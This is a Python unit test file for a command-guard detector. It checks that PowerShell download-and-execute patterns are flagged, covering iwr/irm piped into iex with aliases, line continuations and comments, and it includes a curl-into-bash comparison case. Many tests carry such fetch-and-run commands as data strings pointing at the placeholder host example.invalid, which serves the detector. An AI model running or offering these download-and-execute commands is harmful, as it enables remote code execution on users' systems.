from dataclasses import asdict
import json
import unittest

from sentinel.core.command_guard import CommandSyntaxError, check_command


class PowerShellGuardTests(unittest.TestCase):
    def test_names_aliases_and_literal_urls(self):
        for source in ("Invoke-WebRequest", "Invoke-RestMethod", "iwr", "IRM"):
            for sink in ("Invoke-Expression", "IEX"):
                text = f"{source} -Uri 'https://example.invalid/SYNTHETIC_MARKER' | {sink}"
                with self.subTest(source=source, sink=sink):
                    findings = check_command(text, shell="powershell")
                    self.assertEqual(len(findings), 1)
                    finding = findings[0]
                    self.assertEqual(finding.rule_id, "CF-PS-001")
                    self.assertEqual(finding.severity, "high")
                    self.assertTrue(finding.explanation)
                    self.assertIn("archivo", finding.suggestion)
                    serialized = json.dumps(asdict(finding))
                    self.assertNotIn("SYNTHETIC_MARKER", serialized)
                    self.assertNotIn("example.invalid", serialized)

    def test_spacing_case_and_comments(self):
        for text in (
            'IwR\t-Uri "https://example.invalid/a"|iEx',
            "irm https://example.invalid/a |\n\t iex",
            'iwr https://example.invalid/a | # "ignored quote\n iex',
            "iwr `\n https://example.invalid/a `\n | iex",
            "iwr https://example.invalid/a | <# ' ignored <# nested #> #> iex",
            'iwr "https://example.invalid/a#fragment" | iex',
        ):
            with self.subTest(text=text):
                self.assertEqual(len(check_command(text, shell="powershell")), 1)

    def test_attached_backtick_continuations(self):
        for newline in ("\n", "\r\n"):
            for text in (
                f"iwr`{newline} https://example.invalid/a | iex",
                f"iwr https://example.invalid/a`{newline} | iex",
                f"iwr`{newline} https://example.invalid/a`{newline}|iex",
                f"Invoke-Web`{newline}Request https://example.invalid/a | iex",
            ):
                with self.subTest(text=text):
                    findings = check_command(text, shell="powershell")
                    self.assertEqual(len(findings), 1)
                    self.assertEqual(findings[0].rule_id, "CF-PS-001")

    def test_multiline_block_comments_do_not_separate_commands(self):
        for newline in ("\n", "\r\n"):
            for comment in (
                f'<# first "line{newline}second \'line #>',
                f"<# first{newline}<# nested #>{newline}last #>",
            ):
                for text in (
                    f"iwr https://example.invalid/a {comment} | iex",
                    f"iwr {comment} https://example.invalid/a | iex",
                    f"iwr https://example.invalid/a | {comment} iex",
                ):
                    with self.subTest(text=text):
                        self.assertEqual(len(check_command(text, shell="powershell")), 1)

    def test_strings_keep_backticks_and_apparent_comments(self):
        for text in (
            "Write-Output 'iwr`\n https://example.invalid/a | iex'",
            'Write-Output "iwr`\r\n https://example.invalid/a | iex"',
            "'<# iwr https://example.invalid/a | iex #>'",
            '"<# iwr https://example.invalid/a | iex #>"',
            "iwr 'https://example.invalid/a`\nb' | iex",
            "iwr 'https://example.invalid/a`\r\nb' | iex",
        ):
            with self.subTest(text=text):
                self.assertEqual(check_command(text, shell="powershell"), [])
        for argument in ("'<#not a comment#>'", '"<#not a comment#>"', "'literal`text'"):
            text = f"iwr -UserAgent {argument} https://example.invalid/a | iex"
            with self.subTest(argument=argument):
                self.assertEqual(len(check_command(text, shell="powershell")), 1)

    def test_normal_newlines_still_separate_commands(self):
        for newline in ("\n", "\r\n"):
            for text in (
                f"iwr https://example.invalid/a{newline}iex synthetic",
                f"iwr https://example.invalid/a{newline}Write-Output synthetic | iex",
                f"iwr https://example.invalid/a <# block{newline}comment #>{newline}Write-Output synthetic | iex",
            ):
                with self.subTest(text=text):
                    self.assertEqual(check_command(text, shell="powershell"), [])

    def test_benign_outfile_and_missing_direct_pipe(self):
        for text in (
            "", "iwr https://example.invalid/a -OutFile synthetic.ps1",
            "Invoke-RestMethod https://example.invalid/a -OUTFILE synthetic.ps1 | iex",
            "iwr -OutFile:synthetic.ps1 https://example.invalid/a | Invoke-Expression",
            "iwr https://example.invalid/a", "iwr https://example.invalid/a | Write-Output",
            "iwr https://example.invalid/a; iex synthetic",
            "iwr https://example.invalid/a\niex synthetic",
            "iwr https://example.invalid/a | Write-Output | iex",
            "iwr https://example.invalid/a || iex synthetic",
        ):
            with self.subTest(text=text):
                self.assertEqual(check_command(text, shell="powershell"), [])

    def test_mentions_in_strings_and_comments(self):
        for text in (
            "'iwr https://example.invalid/a | iex'",
            '"Invoke-WebRequest https://example.invalid/a | Invoke-Expression"',
            "Write-Output 'iwr https://example.invalid/a | iex'",
            '# iwr https://example.invalid/a | iex "',
            '<# iwr https://example.invalid/a | iex " #>',
            "iwr https://example.invalid/a # | iex\nWrite-Output synthetic",
        ):
            with self.subTest(text=text):
                self.assertEqual(check_command(text, shell="powershell"), [])

    def test_variables_are_not_literal_urls(self):
        for text in (
            "iwr $uri | iex", 'iwr "https://$host/a" | iex',
            'irm "https://example.invalid/$path" | iex',
            "iwr https://example.invalid/$path | iex", "iwr | iex",
        ):
            with self.subTest(text=text):
                self.assertEqual(check_command(text, shell="powershell"), [])
        self.assertEqual(len(check_command("iwr 'https://example.invalid/$literal' | iex", shell="powershell")), 1)

    def test_shell_selection_is_explicit_and_operation_local(self):
        ps = "iwr https://example.invalid/a | iex"
        bash = "curl https://example.invalid/a | bash"
        self.assertEqual(check_command(ps), [])
        self.assertEqual(check_command(bash, shell="powershell"), [])
        self.assertEqual(check_command(bash), check_command(bash, shell="bash"))
        self.assertEqual(len(check_command(ps, shell="powershell")), 1)
        self.assertEqual(check_command("Write-Output synthetic", shell="powershell"), [])

    def test_invalid_syntax_error_omits_original(self):
        for text in ('iwr "SYNTHETIC_PRIVATE_MARKER', '<# SYNTHETIC_PRIVATE_MARKER'):
            with self.subTest(text=text):
                with self.assertRaises(CommandSyntaxError) as caught:
                    check_command(text, shell="powershell")
                self.assertNotIn("SYNTHETIC_PRIVATE_MARKER", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
